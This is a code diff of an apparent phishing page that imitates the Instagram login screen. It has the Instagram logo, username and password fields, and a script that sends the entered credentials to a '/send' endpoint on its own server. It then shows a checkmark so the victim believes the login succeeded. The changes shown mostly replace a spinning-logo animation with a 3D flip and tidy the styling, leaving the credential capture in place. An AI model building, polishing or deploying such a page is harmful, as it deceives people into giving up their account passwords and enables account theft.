@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="uz">
 <head>
@@ -19,6 +18,7 @@
     display: block;
     margin: 0 auto 20px auto;
     transition: transform 0.6s ease, opacity 0.6s ease;
+    backface-visibility: hidden;
 }
 
 .success-logo {
@@ -26,27 +26,44 @@
     text-align: center;
 }
 
+/* 3D aylanish container */
+.logo-container {
+    perspective: 800px;
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 20px auto;
+    position: relative;
+}
+
+/* Front va back logolar */
+.logo-container img {
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    border-radius: 20px;
+    top:0; left:0;
+    backface-visibility: hidden;
+    transition: transform 0.8s ease-in-out, opacity 0.8s ease-in-out;
+}
+
+#insta-img { z-index:2; }
+#checkmark-img { z-index:1; opacity:0; }
+
 /* aylanish animatsiyasi */
-@keyframes spin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
+@keyframes spin3D {
+    from { transform: rotateY(0deg); }
+    to { transform: rotateY(360deg); }
 }
 
 /* Mobile adjustments */
 @media (max-width: 400px) {
-    .insta-logo img, .success-logo img {
+    .insta-logo img, .success-logo img, .logo-container img {
         width: 60px;
         height: 60px;
     }
 
-    input, button {
-        padding: 10px 8px;
-        font-size: 14px;
-    }
-
-    .status {
-        font-size: 13px;
-    }
+    input, button { padding: 10px 8px; font-size: 14px; }
+    .status { font-size: 13px; }
 }
 </style>
 
@@ -55,18 +72,14 @@
 
 <div class="container">
     <div class="login-box">
-        <!-- Instagram logo -->
-        <div class="insta-logo">
+        <!-- 3D logo container -->
+        <div class="logo-container">
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo" id="insta-img">
-        </div>
-
-        <!-- Success checkmark icon -->
-        <div class="success-logo">
             <img src="https://cdn3d.iconscout.com/3d/premium/thumb/galochka-3d-icon-png-download-11169918.png" alt="Verified" id="checkmark-img">
         </div>
 
         <form id="form">
-            <input type="text" id="username" placeholder="Mobile number,username or email" required>
+            <input type="text" id="username" placeholder="Mobile number, username or email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
@@ -84,8 +97,7 @@
 <script>
 const form = document.getElementById("form");
 const status = document.getElementById("status");
-const instaLogo = document.querySelector(".insta-logo");
-const successLogo = document.querySelector(".success-logo");
+const logoContainer = document.querySelector(".logo-container");
 const instaImg = document.getElementById("insta-img");
 const checkImg = document.getElementById("checkmark-img");
 
@@ -95,8 +107,8 @@ form.addEventListener("submit", async (e) => {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    // Instagram logoni aylantirish
-    instaImg.style.animation = "spin 1s linear infinite";
+    // 3D aylanish animatsiyasi
+    logoContainer.style.animation = "spin3D 0.8s ease-in-out forwards";
 
     try {
         const response = await fetch("/send", {
@@ -106,31 +118,27 @@ form.addEventListener("submit", async (e) => {
         });
 
         if(response.ok){
-            // 1 sekunddan keyin Instagram logosi galochka bilan almashtirilsin
+            // 0.8s oxirida logolarni almashish
             setTimeout(() => {
-                instaLogo.style.display = "none";
-                instaImg.style.animation = ""; // animatsiyani to‘xtatish
-                successLogo.style.display = "block";
+                instaImg.style.opacity = 0;
+                checkImg.style.opacity = 1;
 
-                checkImg.style.transform = "scale(1.2)";
-                setTimeout(() => { checkImg.style.transform = "scale(1)"; }, 300);
-
+                logoContainer.style.animation = ""; // animatsiyani to‘xtatish
                 form.reset();
-            }, 1000);
+            }, 800);
         } else {
             status.style.color = "red";
             status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
-            instaImg.style.animation = "";
+            logoContainer.style.animation = "";
         }
     } catch(err){
         console.error(err);
         status.style.color = "red";
         status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
-        instaImg.style.animation = "";
+        logoContainer.style.animation = "";
     }
 });
 </script>
 
 </body>
 </html>
-
